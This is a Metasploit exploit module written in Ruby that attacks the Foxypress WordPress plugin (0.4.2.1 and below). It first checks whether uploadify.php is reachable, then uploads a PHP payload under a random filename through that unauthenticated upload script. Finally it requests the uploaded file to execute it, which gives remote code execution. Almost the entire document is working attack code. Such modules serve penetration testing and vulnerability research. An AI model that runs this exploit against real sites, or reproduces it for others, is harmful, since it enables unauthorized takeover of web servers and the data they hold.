##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress plugin Foxypress uploadify.php Arbitrary Code Execution',
      'Description'    => %q{
          This module exploits an arbitrary PHP code execution flaw in the WordPress
        blogging software plugin known as Foxypress. The vulnerability allows for arbitrary
        file upload and remote code execution via the uploadify.php script. The Foxypress
        plug-in versions 0.4.2.1 and below are vulnerable.
      },
      'Author'         =>
        [
          'Sammy FORGIT', # Vulnerability Discovery, PoC
          'patrick' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Version'        => '$Revision$',
      'References'     =>
        [
          ['EDB', '18991'],
          ['OSVDB', '82652'],
          ['BID', '53805'],
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Compat'      =>
            {
              'ConnectionType' => 'find',
            },
        },
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Jun 05 2012',
      'DefaultTarget' => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, "The full URI path to WordPress", "/"]),
      ], self.class)
  end

  def check
    uri = target_uri.path
    uri << '/' if uri[-1,1] != '/'

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => "#{uri}wp-content/plugins/foxypress/uploadify/uploadify.php"
    })

    if res and res.code == 200
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    uri = target_uri.path
    uri << '/' if uri[-1,1] != '/'

    peer = "#{rhost}:#{rport}"

    post_data = Rex::MIME::Message.new
    post_data.add_part("<?php #{payload.encoded} ?>", "application/octet-stream", nil, "form-data; name=\"Filedata\"; filename=\"#{rand_text_alphanumeric(6)}.php\"")

    print_status("#{peer} - Sending PHP payload")

    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => "#{uri}wp-content/plugins/foxypress/uploadify/uploadify.php",
      'ctype'  => 'multipart/form-data; boundary=' + post_data.bound,
      'data'   => post_data.to_s
    })

    if not res or res.code != 200 or res.body !~ /\{\"raw_file_name\"\:\"(\w+)\"\,/
      print_error("#{peer} - File wasn't uploaded, aborting!")
      return
    end

    print_good("#{peer} - Our payload is at: #{$1}.php! Calling payload...")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => "#{uri}wp-content/affiliate_images/#{$1}.php"
    })

    if res and res.code != 200
      print_error("#{peer} - Server returned #{res.code.to_s}")
    end

  end

end
